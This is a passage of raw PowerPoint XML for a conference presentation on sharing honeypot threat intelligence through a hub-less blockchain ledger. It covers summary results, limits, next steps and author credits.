          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>What we showed</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="result 1 number"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1380744"/>
            <a:ext cx="594360" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>01</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="result 1 text"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="1417320"/>
            <a:ext cx="4023360" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>A ledger of fingerprints can replace the central hub for honeypots that don't trust each other.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="result 2 number"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2157984"/>
            <a:ext cx="594360" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>02</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="result 2 text"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="2194560"/>
            <a:ext cx="4023360" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Beyond prior work: no on-chain logic, permission-free catch-up, a defense against copied reports.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="result 3 number"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2935224"/>
            <a:ext cx="594360" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>03</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="result 3 text"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="2971800"/>
            <a:ext cx="4023360" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Every cost is measured: 22,120 gas per IOC, 337 batched, ~255 events/s.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="result 4 number"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3712464"/>
            <a:ext cx="594360" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>04</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="result 4 text"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="3749040"/>
            <a:ext cx="4023360" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Accuracy depends on the keying function; /24 + template worked best.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="limits panel"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5486400" y="1371600"/>
            <a:ext cx="3108960" cy="3154680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="limits and next steps"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5715000" y="1508760"/>
            <a:ext cx="2697480" cy="2926080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Limits</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>No consensus delay on the test chain</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Synthetic campaign data</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Sybil resistance needs controlled identity</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Next steps</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Real consortium chain</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Tune the epoch length</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Captured attack traffic</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Slide Number Placeholder 0"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="4294967295"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="475488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3" name="thank you"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1097280"/>
            <a:ext cx="4480560" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Thank you</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="questions"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1965960"/>
            <a:ext cx="4480560" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Questions?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="closing credits"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3154680"/>
            <a:ext cx="4480560" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Hub-less Cross-Honeypot Threat Intelligence</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Suhas Reddy Annem  ·  Sisir Reddy Nellore  ·  Radhika G</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Amrita Vishwa Vidyapeetham, Coimbatore</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="300"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ICOIICS 2026  ·  Paper ICOIICS_245</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="hero panel"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5257800" y="777240"/>
            <a:ext cx="3337560" cy="3429000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="hub-less diagram" descr="Three honeypots write tags to one shared ledger with no owner; a fourth node joins later and reads the same history.">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5394960" y="960120"/>
            <a:ext cx="3063240" cy="2294685"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="hero caption"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5440680" y="3383280"/>
            <a:ext cx="2971800" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" i="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>A ledger of fingerprints can replace the central hub, at a measured cost.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/theme/theme1.xml><?xml version="1.0" encoding="utf-8"?>
<a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" name="Ledger Light">
  <a:themeElements>
    <a:clrScheme name="Ledger Light">
      <a:dk1>
        <a:srgbClr val="1F2328"/>
      </a:dk1>
      <a:lt1>
        <a:srgbClr val="FFFFFF"/>
      </a:lt1>
      <a:dk2>
        <a:srgbClr val="4B5563"/>
      </a:dk2>
      <a:lt2>
        <a:srgbClr val="F4F5F7"/>
      </a:lt2>
      <a:accent1>
        <a:srgbClr val="178A5C"/>
      </a:accent1>
      <a:accent2>
        <a:srgbClr val="C23B35"/>
      </a:accent2>
      <a:accent3>
        <a:srgbClr val="6B7280"/>
      </a:accent3>
      <a:accent4>
        <a:srgbClr val="D9DCE1"/>
      </a:accent4>
      <a:accent5>
        <a:srgbClr val="E6F4EE"/>
      </a:accent5>
      <a:accent6>
        <a:srgbClr val="FBEAE8"/>
      </a:accent6>
      <a:hlink>
        <a:srgbClr val="1F6FB2"/>
      </a:hlink>
      <a:folHlink>
        <a:srgbClr val="6D4C9F"/>
      </a:folHlink>
    </a:clrScheme>
    <a:fontScheme name="Ledger Light">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Hub-less Cross-Honeypot Threat Intelligence</dc:title>
  <dc:subject>ICOIICS 2026, Paper ICOIICS_245</dc:subject>
  <dc:creator>Suhas Reddy Annem, Sisir Reddy Nellore, Radhika G</dc:creator>
  <cp:lastModifiedBy>Suhas Reddy Annem, Sisir Reddy Nellore, Radhika G</cp:lastModifiedBy>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-10-24T05:49:34Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-10-24T05:49:34Z</dcterms:modified>
</cp:coreProperties>
</file>